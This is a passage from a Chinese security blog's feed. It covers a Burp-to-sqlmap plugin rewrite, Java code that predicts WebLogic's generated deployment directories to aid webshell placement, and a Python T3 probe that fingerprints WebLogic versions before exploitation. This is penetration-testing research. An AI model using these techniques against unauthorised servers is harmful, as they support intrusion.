alt="合并解析模版"><br><img src="/articles/2019/apache-solr-velocity-rce-20191031/E339A09C-32EC-43B5-8E47-F38F5E573315.png" alt="漏洞触发效果"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">s00py公开的POC</a></li><li><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="solr" scheme="http://gv7.me/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>重构sqlmap4burp插件</title>
    <link href="http://gv7.me/articles/2019/refactoring-sqlmap4burp/"/>
    <id>http://gv7.me/articles/2019/refactoring-sqlmap4burp/</id>
    <published>2019-09-02T12:18:14.000Z</published>
    <updated>2019-09-02T18:42:18.324Z</updated>
    
    <content type="html"><![CDATA[<p>其实联动sqlmap与burp的插件挺多的，有<a href="https://code.google.com/p/gason/" target="_blank" rel="noopener">gson</a>,<a href="https://github.com/portswigger/co2" target="_blank" rel="noopener">CO2</a>,<a href="https://github.com/portswigger/sqli-py" target="_blank" rel="noopener">sqli-py</a>等等。但我独爱<a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">sqlmap4burp</a>,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。</p><a id="more"></a><p><code>sqlmap4burp</code>项目作者已经很久没有维护了，于是打算对其进行重构。新插件就叫<code>sqlmap4burp++</code>，表示感谢原作者的思路。<code>sqlmap4burp++</code>将<code>兼容更多操作系统</code>，<code>操作更加简单</code>，<code>界面更加简洁</code>！</p><h2 id="0x01-重构之路"><a href="#0x01-重构之路" class="headerlink" title="0x01 重构之路"></a>0x01 重构之路</h2><p>下面简单记录下重构做的一些小工作。</p><h3 id="1-1-去除多余依赖"><a href="#1-1-去除多余依赖" class="headerlink" title="1.1 去除多余依赖"></a>1.1 去除多余依赖</h3><p>原插件依赖<code>commons-io-&lt;version&gt;.jar</code>,<code>commons-langs-&lt;version&gt;.jar</code>这两个jar。但查看代码只是为了可以使用<code>FileUtils.writeByteArrayToFile()</code>和<code>StringUtils.isNoneBlank()</code>两个方法。<code>sqlmap4burp++</code>使用原生Java代码实现，让插件更轻量易编译。</p><h3 id="1-2-去除JTab控件"><a href="#1-2-去除JTab控件" class="headerlink" title="1.2 去除JTab控件"></a>1.2 去除JTab控件</h3><p>现在的Burp插件很丰富，Burp suite JTab控件太多界面会显得特别臃肿。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-tab.png" alt="sqlmap4burp的JTab控件"></p><p>考虑了下该插件并非特别需要JTab面板来添加sqlmap的配置命令，于是去除JTab控件该换成如下的弹窗。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-plus-plus-dlg.png" alt="sqlmap4burp++的弹框控件"></p><h3 id="1-3-多系统支持"><a href="#1-3-多系统支持" class="headerlink" title="1.3 多系统支持"></a>1.3 多系统支持</h3><p>插件会自动将Burp的request数据包保存为<code>xxx.req</code>到java临时目录，而多系统支持无非就是<strong>在目标系统下，能弹出命令行窗口并执行我们的<code>sqlmap -r xxx.req</code>命令</strong>,但各个系统实现的方式都有所不同!</p><h4 id="1-3-1-Windows"><a href="#1-3-1-Windows" class="headerlink" title="1.3.1 Windows"></a>1.3.1 Windows</h4><p>Windows实现比较简单，只需要将sqlmap命令保存为bat脚本（sqlmap4burp.bat），然后执行以下命令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c <span class="built_in">start</span> sqlmap4burp.bat</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">cmds.add(<span class="string">"start"</span>);</span><br><span class="line">String batFilePath = Util.makeBatFile(<span class="string">"sqlmap4burp.bat"</span>,command); <span class="comment">//生成bat文件</span></span><br><span class="line">cmds.add(batFilePath);</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><h4 id="1-3-2-Mac-OS-X"><a href="#1-3-2-Mac-OS-X" class="headerlink" title="1.3.2 Mac OS X"></a>1.3.2 Mac OS X</h4><p>Mac下我们可以编写如下<code>osascript</code>脚本来调用Terminal并让它执行sqlmap命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tell application &quot;Terminal&quot;</span><br><span class="line">activate</span><br><span class="line">do script &quot;sqlmpa.py -r xxx.req&quot;</span><br><span class="line">end tell</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"osascript"</span>);</span><br><span class="line">cmds.add(<span class="string">"-e"</span>);</span><br><span class="line">String cmd = <span class="string">"tell application \"Terminal\" \n"</span> +</span><br><span class="line">        <span class="string">"        activate\n"</span> +</span><br><span class="line">        <span class="string">"        do script \"%s\"\n"</span> +</span><br><span class="line">        <span class="string">"end tell"</span>;</span><br><span class="line">cmds.add(String.format(cmd,command));</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>这里需要注意两点：</p><ul><li>第一次运行，mac会提示是否允许外部程序执行osscript，记得允许！</li><li>有时莫名其妙调用osascript不成功，我们需要确保Terminal是运行状态，如果已经是运行状态，可以重启下。</li></ul><h4 id="1-3-3-Linux"><a href="#1-3-3-Linux" class="headerlink" title="1.3.3 Linux"></a>1.3.3 Linux</h4><p>Linux下想实现弹出命令行窗口同时执行命令，我尝试了很多方法，但是都没有成功的。比较接近想要效果的方法是先将sqlmap命令写到shell脚本中（<code>sqlmap4burp.sh</code>）。然后执行如下命令来运行<code>sqlmap4burp.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -t <span class="string">"sqlmap4burp"</span> -x bash -c <span class="string">"sh ./tmp/sqlmap4burp.sh;exec bash;"</span></span><br></pre></td></tr></table></figure><p>但使用代码去执行的时候并没有弹出<code>Terminal</code>。大家如果有解决方法，可以Fork <a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">sqlmap4burp++</a>项目贡献代码，或者发送想法到我的邮箱root#gv7.me。</p><p>目前采用临时的方法：先弹出<code>Terminal</code>窗口，然后将生成好的sqlmap命令复制剪贴板，最后手工在弹出的窗口中粘贴并执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"/bin/sh"</span>);</span><br><span class="line">cmds.add(<span class="string">"-c"</span>);</span><br><span class="line">cmds.add(<span class="string">"gnome-terminal"</span>);</span><br><span class="line">Util.setSysClipboardText(command); <span class="comment">//sqlmap命令到剪贴板</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>完整代码请移步项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><h2 id="0x02-插件演示"><a href="#0x02-插件演示" class="headerlink" title="0x02 插件演示"></a>0x02 插件演示</h2><p>插件已经在如下系统测试成功：</p><ul><li>Windows：7,10</li><li>Mac OSX：Mojave 10.14.5</li><li>Linux：Kali2019.2</li></ul><p>请FQ观看演示，或者直接访问：<a href="https://www.youtube.com/watch?v=1RWVkztssvw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1RWVkztssvw</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/1RWVkztssvw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="0x03-参考项目"><a href="#0x03-参考项目" class="headerlink" title="0x03 参考项目"></a>0x03 参考项目</h2><ul><li><a href="https://github.com/blueroutecn/Burpsuite4Extender" target="_blank" rel="noopener">https://github.com/blueroutecn/Burpsuite4Extender</a></li><li><a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实联动sqlmap与burp的插件挺多的，有&lt;a href=&quot;https://code.google.com/p/gason/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gson&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/co2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CO2&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/sqli-py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqli-py&lt;/a&gt;等等。但我独爱&lt;a href=&quot;https://github.com/difcareer/sqlmap4burp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqlmap4burp&lt;/a&gt;,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic“伪随机”目录生成算法探究</title>
    <link href="http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/"/>
    <id>http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/</id>
    <published>2019-08-20T03:33:21.000Z</published>
    <updated>2019-08-27T16:34:00.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>我们在渗透测试过程中，可以很容易发现weblogic的    <code>server name</code>一旦被修改，其web应用有一个目录就会发生改变，导致我们在部署war拿shell时受阻。</p><p>比如bea_wls_internal这个weblogic自带web应用的web目录物理路径为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war</strong></p><p>PS：为了后面的讨论，这里统一下概念，域名为<code>base_domain</code>,<code>server name</code>为<code>AdminServer</code>,web应用名为<code>bea_wls_internal</code>,伪随机目录为<code>9j4dqk</code>。</p><p>这时如果<code>server name</code>修改为<code>c0ny1</code>的话，经过测试其伪随机目录会变成<code>qn64ct</code>，即该web应用物理路径变为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\c0ny1\tmp_WL_internal\bea_wls_internal\qn64ct\war</strong></p><h2 id="0x02-真随机-or-伪随机？"><a href="#0x02-真随机-or-伪随机？" class="headerlink" title="0x02 真随机 or 伪随机？"></a>0x02 真随机 or 伪随机？</h2><p>在此前我一直以为改目录是随机的无法。直到我做了下面的测试，将两个域的<code>server name</code>都改为<code>c0ny1</code>。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test1.png" alt="bea_wls_internal随机目录变化"></p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test2.png" alt="bea_wls9_async_reponses随机目录变化"></p><p>发现两个域下相同web应用的随机目录名相同，这说明随机数目录其实是伪随机，它是有算法来生成的。<strong>而通过结果我们很容易就判断出该随机数和域名无关，和<code>server name</code>与<code>application name</code>有关！</strong></p><h2 id="0x03-探究生成算法"><a href="#0x03-探究生成算法" class="headerlink" title="0x03 探究生成算法"></a>0x03 探究生成算法</h2><p>于是我打算跟踪下weblogic源码，扒出负责生产伪随机数的算法函数。由于其生成伪随机目录在weblogic未启动完全情况下，故通过weblogic配置的调试比较难。这种情况下更好的思路是插桩，但要插哪个函数的桩呢？</p><p>我在翻阅weblogic的源码（weblogic.jar）时，着重关注文件操作和部署接口的代码，发现了一个相关性很大的方法。该函数就在weblogic的路径工具类（weblogic.application.utils.PathUtils）中。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-code.png" alt="相关方法"></p><p>在判断不失误的情况下，我们只要知道其传入的参数值就知道改函数如何使用了。为此我编写了如下代码，使用javassist将打印函数参数值的代码注入到该函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">changeMethode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool.getDefault().insertClassPath(<span class="string">"/Users/c0ny1/IdeaProjects/weblogic-path-test/lib/weblogic.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取需要修改的类</span></span><br><span class="line">            CtClass cls = ClassPool.getDefault().getCtClass(<span class="string">"weblogic.application.utils.PathUtils"</span>);</span><br><span class="line">            <span class="comment">// 获取类中的printTest方法</span></span><br><span class="line">            CtMethod m = cls.getDeclaredMethod(<span class="string">"generateTempPath"</span>);</span><br><span class="line">            <span class="comment">// 在方法中插入新的代码</span></span><br><span class="line">            <span class="comment">//m.insertBefore("System.out.println($1 + File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36));") ;</span></span><br><span class="line">            <span class="comment">// 修改该方法的内容</span></span><br><span class="line">            m.setBody(<span class="string">"&#123;StringBuffer var3 = new StringBuffer();\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($1 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append($1);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($2 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($2);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($3 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($3);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        String str = $2 + java.io.File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p1:\" + $1);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p2:\" + $2);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p3:\" + $3);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] \" + str);\n"</span> +</span><br><span class="line">                    <span class="string">"        return str;&#125;"</span>);</span><br><span class="line">                    </span><br><span class="line">            <span class="comment">// 解除代码锁定,恢复可编辑状态</span></span><br><span class="line">            cls.defrost();</span><br><span class="line">            <span class="comment">// 写出到外存中</span></span><br><span class="line">            cls.writeFile(<span class="string">"./PathUtils.class"</span>);</span><br><span class="line">            <span class="comment">// testJarClass.writeFile(other path);</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        changeMethode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/inject-code.png" alt="被注入代码后的PathUtils类"></p><p>将插桩后的PathUtils类通过Winrar软件覆盖weblogic.jar原来的类，然后重新启动weblogic，即可从控制台查看到如下：</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-run-result.png" alt="weblogic重启运行结果"></p><p>由此我们知道web应用bea_wls9_async_response的随机目录被生成时，该函数被调用并传入<code>server name</code>和<code>application name</code>，这也验证我们之前的猜想。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateTempPath(<span class="string">"c0ny1"</span>,<span class="string">"bea_wls9_async_response"</span>,<span class="string">"bea_wls9_async_response.war"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-伪随机目录生成代码编写"><a href="#0x04-伪随机目录生成代码编写" class="headerlink" title="0x04 伪随机目录生成代码编写"></a>0x04 伪随机目录生成代码编写</h2><p>到这里写计算伪随机目录生成程序就是很简单的事了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeblogicPathBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateTempPath</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) stringBuffer.append(paramString1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.toString(Math.abs(stringBuffer.toString().hashCode()), <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String ServerName = args[<span class="number">0</span>];</span><br><span class="line">        String AppName = args[<span class="number">1</span>];</span><br><span class="line">        String AppWarName = AppName + <span class="string">".war"</span>;</span><br><span class="line">        System.out.println(generateTempPath(ServerName,AppName,AppWarName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算结果和weblogic实际生成完全吻合！！！</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/calc.png" alt="计算结果"></p><p>之后的几天逛Github时，发现早就有人发现其规律。</p><p><a href="https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;我们在渗透测试过程中，可以很容易发现weblogic的    &lt;code&gt;serve
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>通过t3协议识别weblogic版本</title>
    <link href="http://gv7.me/articles/2019/detection-weblogic-version-by-t3/"/>
    <id>http://gv7.me/articles/2019/detection-weblogic-version-by-t3/</id>
    <published>2019-06-10T01:49:51.000Z</published>
    <updated>2019-08-27T01:52:50.892Z</updated>
    
    <content type="html"><![CDATA[<p><strong>识别weblogic版本有什么用呢？</strong></p><p>在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）</p><a id="more"></a><h2 id="0x01-以前的方法"><a href="#0x01-以前的方法" class="headerlink" title="0x01 以前的方法"></a>0x01 以前的方法</h2><p>以前的方法是访问控制台登录页面，页面底部便有版本号！这里注意404页面的<code>10.4.5</code>并不是版本号。</p><p>http://<em>.</em>.<em>.</em>:7001/console/login/LoginForm.jsp</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/login.png" alt="控制台登录页面"></p><p>然而这个页面可能会被删除或禁止访问，那有没有其他方法呢？</p><h2 id="0x02-通过t3协议识别"><a href="#0x02-通过t3协议识别" class="headerlink" title="0x02 通过t3协议识别"></a>0x02 通过t3协议识别</h2><p>最近在学习t3协议时，使用wireshark抓包时发现，协议报文中带有weblogic的版本</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/10.3.6.0.png" alt="使用t3协议10.3.6.0版本通信"></p><p><img src="/articles/2019/detection-weblogic-version-by-t3/12.1.3.0.png" alt="使用t3协议12.1.3.0版本通信"></p><p>所以只需要通过t3协议发送以下数据包，即可从返回包中获取Weblogic版本。</p><pre><code>t3 10.3.6AS: 255HL: 19</code></pre><p>这里需要注意，有时候发送数据包时，可能只会返回一个<code>HELLO</code>。这时候说明t3协议应该是开启的，需要多次提交探测包，才可能在某次中成功获取到。</p><p>下面使用脚本来完成我们的上面的想法。</p><pre><code class="python"><span class="comment">#coding=utf-8</span><span class="keyword">import</span> sys<span class="keyword">import</span> socket<span class="keyword">from</span> socket <span class="keyword">import</span> error <span class="keyword">as</span> socket_error<span class="keyword">import</span> urllib<span class="string">'''</span><span class="string">'''</span><span class="function"><span class="keyword">def</span> <span class="title">t3conn</span><span class="params">(host, port)</span>:</span>        <span class="keyword">try</span>:            server_address = (host, port)            <span class="comment">#print 'INFO: Attempting Connection: ' + str(server_address)</span>            sock = socket.create_connection(server_address, <span class="number">4</span>)            sock.settimeout(<span class="number">5</span>)            headers = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span>            sock.sendall(headers)            data = <span class="string">""</span>            <span class="keyword">try</span>:                data = sock.recv(<span class="number">1024</span>)            <span class="keyword">except</span> socket.timeout:                <span class="keyword">print</span> <span class="string">'ERROR: Socket Timeout Occurred: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            sock.close()            <span class="keyword">return</span> data        <span class="keyword">except</span> socket_error:            <span class="keyword">print</span> <span class="string">'ERROR: Connection Failed: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            <span class="keyword">return</span> <span class="string">""</span><span class="function"><span class="keyword">def</span> <span class="title">parseURL</span><span class="params">(url)</span>:</span>    protocol, s1 = urllib.splittype(url)    host, s2=  urllib.splithost(s1)    host, port = urllib.splitport(host)    <span class="keyword">if</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'https'</span>:        port = <span class="number">443</span>    <span class="keyword">elif</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'http'</span>:        port = <span class="number">80</span>    <span class="keyword">return</span> protocol,host,port<span class="function"><span class="keyword">def</span> <span class="title">weblogic</span><span class="params">(url)</span>:</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):        protocol,host,port = parseURL(url)        data = t3conn(host, port)        <span class="keyword">if</span> data.strip() == <span class="string">'HELO'</span>:            <span class="keyword">print</span> <span class="string">'INFO: Sever only returned HELO, retrying to get server version.'</span>            <span class="keyword">continue</span>        <span class="keyword">if</span> data == <span class="string">""</span>:            <span class="keyword">break</span>        <span class="keyword">print</span> data        <span class="keyword">if</span> <span class="string">'HELO'</span> <span class="keyword">in</span> data:            found_weblogic_version = data[<span class="number">5</span>:<span class="number">13</span>]            <span class="keyword">print</span> <span class="string">'[+] version: %s'</span> % found_weblogic_version             <span class="comment">#print '[+] result: %s' % data</span>            <span class="keyword">break</span><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>    <span class="keyword">pass</span><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    weblogic(sys.argv[<span class="number">1</span>])</code></pre><p><img src="/articles/2019/detection-weblogic-version-by-t3/result.png" alt="脚本探测结果"></p><p>如果未探测到，以下几种可能情况：</p><ol><li>t3协议未启用</li><li>服务器做了负载均衡</li></ol><h2 id="0x03-遗留问题"><a href="#0x03-遗留问题" class="headerlink" title="0x03 遗留问题"></a>0x03 遗留问题</h2><p>有些weblogic站点用的https协议，得有t3s协议去探测，我虽然在代码中考虑到了。但是没未成功，一是没有现成的环境，二是没有实实在在使用过t3s协议。等等weblogic经验更丰富时，在解决！</p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>本来想学n1nty师傅对struts2框架的识别的思路，研究目标应用的底层代码，再构造特定的数据包来识别。无奈目前的知识和经验储备还无法支撑这个思路，等后面深入weblogic底层代码时，有发现再做尝试。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;识别weblogic版本有什么用呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>如何快速找到POC/EXP依赖的jar？</title>
    <link href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/"/>
    <id>http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/</id>
    <published>2019-05-21T18:43:48.000Z</published>
    <updated>2019-05-21T18:49:22.000Z</updated>
    
